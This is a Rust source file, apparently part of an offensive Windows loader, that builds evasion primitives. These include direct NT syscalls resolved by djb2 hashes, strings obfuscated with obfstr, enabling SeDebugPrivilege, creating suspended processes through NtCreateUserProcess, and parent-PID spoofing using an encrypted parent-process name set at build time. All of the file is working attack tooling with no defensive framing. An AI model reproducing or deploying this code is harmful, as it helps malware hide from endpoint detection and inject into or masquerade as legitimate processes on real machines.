use super::types::*;
use crate::ntapi::def::{CURRENT_PROCESS, PROCESS_ALL_ACCESS};
use crate::syscall;
use crate::utils::{Handle, RslError, RslResult};
use core::ffi::c_void;
use ntapi::ntapi_base::*;
use ntapi::ntpsapi::*;
use ntapi::ntrtl::*;
use obfstr::obfstr;
use std::env;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;
use windows_sys::Win32::Foundation::{LUID, UNICODE_STRING};
use windows_sys::Win32::Security::*;

pub fn open_process(pid: u32, access: u32) -> RslResult<isize> {
    let mut handle: isize = 0;
    let mut client_id = ClientId {
        unique_process: pid as isize,
        unique_thread: 0,
    };
    let mut oa = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0,
        object_name: core::ptr::null_mut(),
        attributes: 0,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };

    let nt_open_hash = crate::dbj2_hash!(b"NtOpenProcess");

    let status = unsafe {
        syscall!(
            nt_open_hash,
            NtOpenProcessFn,
            (&mut handle as *mut isize as u64),
            access as u64,
            (&mut oa as *mut ObjectAttributes as u64),
            (&mut client_id as *mut ClientId as u64)
        )
    };

    match status {
        Some(s) if s < 0 => Err(RslError::NtStatus(s)),
        Some(_) => Ok(handle),
        None => Err(RslError::SyscallFailed(nt_open_hash)),
    }
}

pub fn query_information_process(
    process_handle: isize,
    process_information_class: u32,
    process_information: *mut core::ffi::c_void,
    process_information_length: u32,
    return_length: *mut u32,
) -> RslResult<i32> {
    let nt_query_hash = crate::dbj2_hash!(b"NtQueryInformationProcess");

    let status = unsafe {
        syscall!(
            nt_query_hash,
            NtQueryInformationProcessFn,
            process_handle as u64,
            process_information_class as u64,
            process_information as u64,
            process_information_length as u64,
            return_length as u64
        )
    };

    match status {
        Some(s) => Ok(s),
        None => Err(RslError::SyscallFailed(nt_query_hash)),
    }
}

pub fn normalize_nt_path(target: &str) -> RslResult<String> {
    let sys_root = env::var(obfstr!("SystemRoot")).unwrap_or_else(|_| obfstr!("C:\\Windows").to_string());
    let mut path = PathBuf::from(target.replace(obfstr!("/"), obfstr!("\\")));

    let file_name = path.file_name().and_then(|s| s.to_str()).unwrap_or("");
    if file_name.eq_ignore_ascii_case(obfstr!("notepad.exe")) {
        path = PathBuf::from(&sys_root).join(obfstr!("notepad.exe"));
    } else if path.parent().map_or(true, |p| p.as_os_str().is_empty()) {
        path = PathBuf::from(&sys_root).join(obfstr!("System32")).join(target);
    }

    let canonical = path.canonicalize().map_err(|e| RslError::IoError(e))?;
    let path_str = canonical
        .to_str()
        .ok_or_else(|| RslError::Other(obfstr!("Invalid UTF-8").to_string()))?;

    if let Ok(kernel_path) = get_kernel_native_path(path_str) {
        return Ok(kernel_path);
    }

    Ok(path_str.replace(obfstr!(r"\\?\"), obfstr!(r"\??\")))
}

pub fn get_kernel_native_path(path: &str) -> RslResult<String> {
    use std::fs::File;
    use std::os::windows::io::AsRawHandle;
    use windows_sys::Win32::Storage::FileSystem::{
        GetFinalPathNameByHandleW, FILE_NAME_NORMALIZED, VOLUME_NAME_NT,
    };

    let file = File::open(path).map_err(|e| RslError::IoError(e))?;
    let handle = file.as_raw_handle();

    let mut buffer = [0u16; 1024];
    let len = unsafe {
        GetFinalPathNameByHandleW(
            handle as isize,
            buffer.as_mut_ptr(),
            buffer.len() as u32,
            FILE_NAME_NORMALIZED | VOLUME_NAME_NT,
        )
    };

    if len == 0 {
        return Err(RslError::Other(
            obfstr!("GetFinalPathNameByHandleW failed").to_string(),
        ));
    }

    let path_str = String::from_utf16_lossy(&buffer[..len as usize]);
    Ok(path_str)
}

pub fn enable_debug_privilege() -> RslResult<()> {
    let mut h_token: isize = 0;
    let nt_open_token_hash = crate::dbj2_hash!(b"NtOpenProcessToken");

    let status = unsafe {
        syscall!(
            nt_open_token_hash,
            NtOpenProcessTokenFn,
            CURRENT_PROCESS as u64,
            0x0020 as u64, // TOKEN_ADJUST_PRIVILEGES
            &mut h_token as *mut isize as u64
        )
    };

    if let Some(s) = status {
        if s < 0 {
            return Err(RslError::NtStatus(s));
        }
    } else {
        return Err(RslError::SyscallFailed(nt_open_token_hash));
    }

    let token = Handle::from(h_token);
    let mut luid = LUID {
        LowPart: 0,
        HighPart: 0,
    };

    unsafe {
        let priv_name = obfstr!("SeDebugPrivilege\0")
            .encode_utf16()
            .collect::<Vec<u16>>();
        if windows_sys::Win32::Security::LookupPrivilegeValueW(
            core::ptr::null(),
            priv_name.as_ptr(),
            &mut luid,
        ) == 0
        {
            return Err(RslError::Other(
                obfstr!("LookupPrivilegeValueW failed").to_string(),
            ));
        }

        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: 0x00000002, // SE_PRIVILEGE_ENABLED
            }],
        };

        let nt_adjust_hash = crate::dbj2_hash!(b"NtAdjustPrivilegesToken");
        let status = syscall!(
            nt_adjust_hash,
            NtAdjustPrivilegesTokenFn,
            token.as_raw() as u64,
            0u32 as u64,
            &mut tp as *mut TOKEN_PRIVILEGES as u64,
            std::mem::size_of::<TOKEN_PRIVILEGES>() as u64,
            core::ptr::null_mut::<c_void>() as u64,
            core::ptr::null_mut::<u32>() as u64
        );

        if let Some(s) = status {
            if s < 0 {
                return Err(RslError::NtStatus(s));
            }
        } else {
            return Err(RslError::SyscallFailed(nt_adjust_hash));
        }
    }

    Ok(())
}

pub fn create_process(
    target_program: &str,
    parent_handle: Option<isize>,
    suspended: bool,
) -> RslResult<(isize, isize)> {
    let nt_path = normalize_nt_path(target_program)?;
    let nt_path_u16: Vec<u16> = nt_path.encode_utf16().chain(std::iter::once(0)).collect();

    let mut image_path_unicode = UNICODE_STRING {
        Length: ((nt_path_u16.len() - 1) * 2) as u16,
        MaximumLength: (nt_path_u16.len() * 2) as u16,
        Buffer: nt_path_u16.as_ptr() as *mut u16,
    };

    let ntdll_hash = crate::dbj2_hash!(b"ntdll.dll");
    let ntdll_base = unsafe { crate::syscall::common::get_loaded_module_by_hash(ntdll_hash) }
        .ok_or(RslError::ModuleNotFound(ntdll_hash))?;

    let mut process_parameters: *mut c_void = core::ptr::null_mut();
    let params_status = unsafe {
        let addr = crate::syscall::common::pe::get_export_by_hash(
            ntdll_base,
            crate::dbj2_hash!(b"RtlCreateProcessParametersEx"),
        )
        .ok_or(RslError::FunctionNotFound(crate::dbj2_hash!(
            b"RtlCreateProcessParametersEx"
        )))?;
        let create_params: unsafe extern "system" fn(
            *mut *mut c_void,
            *mut UNICODE_STRING,
            *mut UNICODE_STRING,
            *mut UNICODE_STRING,
            *mut UNICODE_STRING,
            *mut c_void,
            *mut UNICODE_STRING,
            *mut c_void,
            *mut c_void,
            *mut c_void,
            u32,
        ) -> i32 = core::mem::transmute(addr);

        create_params(
            &mut process_parameters,
            &mut image_path_unicode,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            &mut image_path_unicode,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            0x01,
        )
    };
    if params_status < 0 {
        return Err(RslError::NtStatus(params_status));
    }

    let mut attrs = Vec::new();
    let image_attr_size: usize = image_path_unicode.Length as usize;

    attrs.push(PS_ATTRIBUTE {
        Attribute: PS_ATTRIBUTE_IMAGE_NAME as usize,
        Size: image_attr_size,
        u: PS_ATTRIBUTE_u {
            ValuePtr: nt_path_u16.as_ptr() as *mut _,
        },
        ReturnLength: std::ptr::null_mut(),
    });

    if let Some(h_parent) = parent_handle {
        attrs.push(PS_ATTRIBUTE {
            Attribute: PS_ATTRIBUTE_PARENT_PROCESS as usize,
            Size: std::mem::size_of::<usize>(),
            u: PS_ATTRIBUTE_u {
                ValuePtr: h_parent as *mut _,
            },
            ReturnLength: std::ptr::null_mut(),
        });
    }

    let header_size = std::mem::size_of::<usize>();
    let total_attr_size = header_size + (attrs.len() * std::mem::size_of::<PS_ATTRIBUTE>());
    let mut attr_list_buffer = vec![0u8; total_attr_size];

    unsafe {
        let total_len_ptr = attr_list_buffer.as_mut_ptr() as *mut usize;
        *total_len_ptr = total_attr_size as usize;

        let attributes_ptr = attr_list_buffer.as_mut_ptr().add(header_size) as *mut PS_ATTRIBUTE;
        for (i, attr) in attrs.iter().enumerate() {
            std::ptr::write(attributes_ptr.add(i), *attr);
        }
    }

    let mut create_info: PS_CREATE_INFO = unsafe { std::mem::zeroed() };
    create_info.Size = std::mem::size_of::<PS_CREATE_INFO>();
    create_info.State = PsCreateInitialState;
    create_info.u.InitState.InitFlags = 0x00000003;

    let mut h_process: isize = 0;
    let mut h_thread: isize = 0;
    let thread_flags = if suspended { 0x1 } else { 0 };

    let status = unsafe {
        syscall!(
            crate::dbj2_hash!(b"NtCreateUserProcess"),
            NtCreateUserProcessFn,
            &mut h_process as *mut isize,
            &mut h_thread as *mut isize,
            0x001F0FFF,
            0x001F0FFF,
            core::ptr::null_mut::<c_void>(),
            core::ptr::null_mut::<c_void>(),
            0u32,
            thread_flags,
            process_parameters,
            &mut create_info as *mut PS_CREATE_INFO,
            attr_list_buffer.as_mut_ptr() as *mut PS_ATTRIBUTE_LIST
        )
    };

    unsafe {
        if let Some(addr) = crate::syscall::common::pe::get_export_by_hash(
            ntdll_base,
            crate::dbj2_hash!(b"RtlDestroyProcessParameters"),
        ) {
            let destroy: unsafe extern "system" fn(*mut c_void) = core::mem::transmute(addr);
            destroy(process_parameters);
        }
    }

    match status {
        Some(s) if s < 0 => Err(RslError::NtStatus(s)),
        Some(_) => Ok((h_process, h_thread)),
        None => Err(RslError::SyscallFailed(crate::dbj2_hash!(
            b"NtCreateUserProcess"
        ))),
    }
}

pub fn ldr_load_dll(dll_name: &str, dll_hash: u32) -> crate::utils::error::RslResult<isize> {
    use crate::syscall::common::get_loaded_module_by_hash;
    use crate::syscall::common::pe::get_export_by_hash;

    // 1. Try to find the module by hash first
    if let Some(base) = unsafe { get_loaded_module_by_hash(dll_hash) } {
        return Ok(base as isize);
    }

    // 2. If not found, load it using LdrLoadDll
    let ntdll_hash = crate::dbj2_hash!(b"ntdll.dll");
    let ntdll_base = unsafe { get_loaded_module_by_hash(ntdll_hash) }
        .ok_or(RslError::ModuleNotFound(ntdll_hash))?;

    let ldr_load_dll_hash = crate::dbj2_hash!(b"LdrLoadDll");
    let ldr_load_dll_addr = unsafe { get_export_by_hash(ntdll_base, ldr_load_dll_hash) }
        .ok_or(RslError::FunctionNotFound(ldr_load_dll_hash))?;

    let ldr_load_dll: LdrLoadDllFn = unsafe { core::mem::transmute(ldr_load_dll_addr) };

    let mut utf16_name: Vec<u16> = dll_name.encode_utf16().collect();
    let mut unicode_string = UnicodeString {
        length: (utf16_name.len() * 2) as u16,
        maximum_length: (utf16_name.len() * 2) as u16,
        buffer: utf16_name.as_mut_ptr(),
    };

    let mut handle: *mut c_void = core::ptr::null_mut();
    let status = unsafe {
        ldr_load_dll(
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            &mut unicode_string,
            &mut handle,
        )
    };

    if status < 0 {
        return Err(RslError::NtStatus(status));
    }

    Ok(handle as isize)
}

pub unsafe fn create_process_with_spoofing(
    target_program: &str,
    suspended: bool,
) -> RslResult<windows_sys::Win32::System::Threading::PROCESS_INFORMATION> {
    use crate::utils::simple_decrypt;
    use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;

    let _ = enable_debug_privilege();

    let parent_handle: Option<Handle> = {
        #[cfg(feature = "ppid_spoofing")]
        {
            let parent_name = simple_decrypt(env!("RSL_ENCRYPTED_PARENT_PROCESS_NAME"));
            let parent_hash = crate::utils::dbj2_hash(parent_name.as_bytes());

            match crate::syscall::common::get_process_id_by_name(parent_hash) {
                Ok(parent_pid) => match open_process(parent_pid, 0x001F0FFF) {
                    Ok(h) => Some(Handle::from(h)),
                    Err(_) => {
                        if let Ok(_) = enable_debug_privilege() {
                            open_process(parent_pid, 0x001F0FFF).ok().map(Handle::from)
                        } else {
                            None
                        }
                    }
                },
                Err(_) => None,
            }
        }
        #[cfg(not(feature = "ppid_spoofing"))]
        {
            None
        }
    };

    let (process_handle, thread_handle) = create_process(
        target_program,
        parent_handle.as_ref().map(|h| h.as_raw() as isize),
        suspended,
    )?;

    Ok(PROCESS_INFORMATION {
        hProcess: process_handle as windows_sys::Win32::Foundation::HANDLE,
        hThread: thread_handle as windows_sys::Win32::Foundation::HANDLE,
        dwProcessId: 0,
        dwThreadId: 0,
    })
}
